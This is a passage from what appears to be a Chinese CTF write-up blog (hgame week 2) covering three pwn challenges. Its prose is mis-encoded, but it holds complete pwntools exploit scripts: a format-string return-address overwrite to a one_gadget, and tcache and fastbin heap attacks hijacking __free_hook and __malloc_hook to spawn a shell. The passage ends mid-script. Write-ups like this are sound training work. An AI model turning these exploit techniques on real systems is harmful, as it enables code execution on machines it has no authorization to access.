title="YukkuriSay"></a>YukkuriSay</h3><p>è€ƒå¯Ÿæ ˆå¤–çš„æ ¼å¼åŒ–æ¼æ´ï¼Œä¸”<code>read</code>æ¬¡æ•°åªæœ‰ä¸€æ¬¡ï¼Œè¯´æ˜ä¸€æ¬¡åªèƒ½ä¿®æ”¹ä¸€ä¸ªæŒ‡å®šåœ°å€ã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/99040/18/33955/52628/63c4b592Fdf5a68c1/c4c2b5bfadb8f836.png" style="zoom: 67%;" /><ul><li>ç¬¬ä¸€æ¬¡éœ€è¦ç”¨æ¥æ³„éœ²+è¿”å›ï¼Œå°†<code>buf</code>å……æ»¡ï¼Œä¼šé€šè¿‡<code>print_str</code>æ³„éœ²å‡ºä¸€ä¸ªæ®‹ç•™çš„æ ˆåœ°å€ï¼š</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/140789/38/32753/51582/63c4b696F25308ff7/31bf55ae390a5057.png" style="zoom:67%;" /><ul><li>ä¸è¦<code>n</code>ï¼Œç»§ç»­åœ¨<code>buf</code>ä¸Šå¸ƒç½®æ ˆè¿”å›åœ°å€ï¼Œä½¿å…¶è¿”å›åˆ°<code>_start</code>ï¼ˆè¿”å›<code>main</code>å’Œ<code>vuln</code>ä¼šæŠ¥é”™ï¼‰ï¼Œé¡ºä¾¿æ³„éœ²å‡º<code>libc</code>ã€‚</li><li>ç”±äº<code>printf(str)</code>æœ€ç¨³å¦¥çš„ä¿®æ”¹æ–¹æ³•æ˜¯ä¸€ä¸ªåœ°å€ä¸­çš„<code>1å­—èŠ‚+2å­—èŠ‚</code>(<code>2+2</code>éœ€è¦çˆ†ç ´)ï¼Œå› æ­¤ä¸éš¾æƒ³åˆ°åŠ«æŒç¨‹åºæ‰§è¡Œæµä¸º<code>one_gadget</code>ï¼Œè€Œè¿”å›åœ°å€<code>__libc_start_main+???</code>ä½œä¸º<code>libc</code>åœ°å€æ˜¾ç„¶å’Œ<code>one_gadget</code>å…·æœ‰æ›´å¥½çš„ç›¸ä¼¼æ€§ï¼Œåœ¨è¿”å›åˆ°<code>__libc_start_main+???</code>æ—¶å¯ä»¥è§‚å¯Ÿåˆ°<code>rdx=0</code>å’Œ<code>r15=0</code>ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [r12] == NULL || r12 == NULL</span><br><span class="line"></span><br><span class="line">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line"></span><br><span class="line">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == NULL || rsi == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br></pre></td></tr></table></figure><ul><li>ä¸éš¾æƒ³åˆ°ç”¨ç¬¬äºŒä¸ª<code>gadget</code>ã€‚</li><li><code>exp</code>å¦‚ä¸‹ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-2.hgame.lwsec.cn&quot;</span>,<span class="number">31352</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;vuln&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;What would you like to let Yukkri say?\n&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">256</span>)</span><br><span class="line">stack=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">8</span></span><br><span class="line">log.success(<span class="string">&quot;stack===&gt;&quot;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;anything else?(Y/n)\n&quot;</span>,<span class="string">b&quot;Y&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.send(p64(stack)*<span class="number">32</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;anything else?(Y/n)\n&quot;</span>,<span class="string">b&quot;n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;%45$p%4418c%8$hn&quot;</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">243</span>-libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base==&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">one_gadget=libc_base+<span class="number">0xe3b01</span></span><br><span class="line">m1=(one_gadget&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span></span><br><span class="line">m2=one_gadget &amp; <span class="number">0xffff</span></span><br><span class="line">log.success(<span class="string">&quot;one_gadget==&quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line">log.success(<span class="string">&quot;m1=&quot;</span>+<span class="built_in">hex</span>(m1)+<span class="string">&quot;;m2=&quot;</span>+<span class="built_in">hex</span>(m2))</span><br><span class="line">stack2=stack-<span class="number">224</span></span><br><span class="line">log.success(<span class="string">&quot;stack2==&quot;</span>+<span class="built_in">hex</span>(stack2))</span><br><span class="line">io.sendafter(<span class="string">&quot;What would you like to let Yukkri say?\n&quot;</span>,p64(stack2+<span class="number">2</span>)+p64(stack2))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;anything else?(Y/n)\n&quot;</span>,<span class="string">b&quot;n&quot;</span>)</span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%8$hhn&quot;</span>.<span class="built_in">format</span>(m1)</span><br><span class="line">payload+=<span class="string">&quot;%&#123;&#125;c%9$hn&quot;</span>.<span class="built_in">format</span>(m2-m1)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="editable-note"><a href="#editable-note" class="headerlink" title="editable_note"></a>editable_note</h3><p><code>libc2.31</code>ä¸‹å¸¸è§„çš„<code>uaf</code>æ¼æ´ã€‚</p><ul><li>addï¼š</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">add_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> size[<span class="number">7</span>]; <span class="comment">// [rsp+4h] [rbp-1Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  *&amp;size[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( notes[v2] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;This page has been used.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, size);</span><br><span class="line">      <span class="keyword">if</span> ( size[<span class="number">0</span>] &lt;= <span class="number">0xFF</span>u )</span><br><span class="line">      &#123;</span><br><span class="line">        v0 = v2;</span><br><span class="line">        notes[v0] = <span class="built_in">malloc</span>(size[<span class="number">0</span>]);</span><br><span class="line">        note_size[v2] = size[<span class="number">0</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Too big.&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;There are only 16 pages in this notebook.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ *&amp;size[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>deleteä¸­å‡ºç°<code>uaf</code>æ¼æ´ï¼š</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">delete_note</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( notes[v2] )</span><br><span class="line">      <span class="built_in">free</span>(notes[v2]);<span class="comment">// uafæ¼æ´</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Page not found.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;There are only 16 pages in this notebook.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>editï¼š</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">edit_note</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( notes[v2] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, notes[v2], note_size[v2]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Page not found.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;There are only 16 pages in this notebook.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>showï¼š</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">show_note</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( notes[v2] )</span><br><span class="line">      <span class="built_in">puts</span>(notes[v2]);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Page not found.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;There are only 16 pages in this notebook.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>ç”³è¯·9ä¸ª<code>unsortedbin</code>å¤§å°çš„å †ï¼Œé‡Šæ”¾å‰8ä¸ªï¼Œå…¶ä¸­7ä¸ªè¿›å…¥<code>tcachebin</code>ï¼Œ1ä¸ªè¿›å…¥<code>unsortedbin</code>ï¼Œç¬¬9ä¸ªå †ç”¨äºé¿å…è¢«<code>topchunk</code>å¸æ”¶ã€‚</li><li>æ‰“å°å¾—åˆ°<code>libc</code>åœ°å€ï¼Œè®¡ç®—<code>__free_hook</code>å’Œ<code>system</code>ã€‚</li><li>ä¿®æ”¹ç¬¬6ä¸ªå †çš„<code>fd</code>æŒ‡é’ˆæŒ‡å‘<code>__free_hook</code>ã€‚</li><li>å†ç”³è¯·2ä¸ªå †ï¼ŒåŠ«æŒ<code>__free_hook</code>ä¸º<code>system</code>ã€‚</li><li><code>exp</code>å¦‚ä¸‹ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-2.hgame.lwsec.cn&quot;</span>,<span class="number">31047</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">112</span>-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">10</span>,p64(system))</span><br><span class="line">edit(<span class="number">9</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="fast-note"><a href="#fast-note" class="headerlink" title="fast_note"></a>fast_note</h3><p><code>libc2.23</code>ä¸‹çš„<code>uaf</code>æ¼æ´ï¼Œæ— <code>edit</code>åŠŸèƒ½ï¼Œå…¶ä»–åŠŸèƒ½å’Œä¸Šè¿°ä¸€æ ·ï¼Œå› æ­¤å¯ä»¥æ„é€ <code>double free</code>ã€‚</p><ul><li>ç”³è¯·ä¸¤ä¸ªå †ï¼Œç¬¬ä¸€ä¸ªæœ‰<code>unsortedbin</code>å¤§å°ï¼Œé‡Šæ”¾ç¬¬ä¸€ä¸ªï¼Œæ³„éœ²<code>libc</code>ã€‚</li><li>å†ç”³è¯·ä¸¤ä¸ªæ•°æ®å¤§å°ä¸º<code>0x60</code>çš„å †ï¼Œé‡Šæ”¾å…¶ä¸­ç¬¬ä¸€ä¸ªï¼Œå†é‡Šæ”¾ç¬¬äºŒä¸ªï¼Œå†é‡Šæ”¾ç¬¬ä¸€ä¸ªï¼Œç»•è¿‡æ£€æŸ¥ï¼Œè¾¾æˆ<code>double free</code>ã€‚</li><li>å†ç”³è¯·ä¸€ä¸ªæ•°æ®å¤§å°ä¸º<code>0x60</code>çš„å †ï¼Œå¹¶ä¿®æ”¹å…¶<code>fd</code>æŒ‡å‘<code>__malloc_hook-0x23</code>å¤„ã€‚</li><li>å°†<code>__malloc_hook-0x23</code>å¤„çš„å †å—ç”³è¯·è¿‡æ¥ï¼Œä¿®æ”¹<code>__malloc_hook</code>ä¸º<code>one_gadget</code>ï¼Œå¿…è¦æ—¶ç”¨<code>realloc</code>è¿›è¡Œè°ƒæ•´ã€‚</li><li><code>exp</code>å¦‚ä¸‹ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-2.hgame.lwsec.cn&quot;</span>,<span class="number">30160</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x80</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">104</span>-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">log,success(<span class="string">&quot;libc_base==&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">gadgets=[<span class="number">0x4527a</span>,<span class="number">0x45226</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">one_gadget=libc_base+gadgets[<span class="number">3</span>]</span><br><span class="line">realloc=libc_base+libc.sym[<span class="string">&quot;realloc&quot;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x60</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x60</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x60</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">7</span>,<span 